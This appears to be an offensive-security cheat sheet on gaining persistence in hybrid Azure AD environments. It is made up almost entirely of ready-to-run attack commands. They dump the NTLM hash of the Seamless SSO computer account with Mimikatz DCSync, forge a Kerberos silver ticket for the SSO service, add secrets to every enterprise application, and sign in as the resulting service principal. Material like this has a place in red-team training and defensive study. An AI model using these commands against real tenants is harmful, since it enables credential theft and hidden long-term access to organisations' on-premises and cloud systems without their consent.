# Persistence

## Hybrid identity - Seamless SSO
- If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.
- Password/key of the AZUREADSSOACC never changes.

#### Get NTLM hash of AZUREADSSOC account
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\azureadssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

#### Create a silver ticket
```
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"' 
```

## Add credentials to enterprise applications
#### Check if secrets (application passwords) can be added to all enterprise applications
```
. .\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graphtoken -Verbose
```

#### Use the secret to autheticate as service principal.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

### Check what resources service principal can access
```
Get-AzResource
```
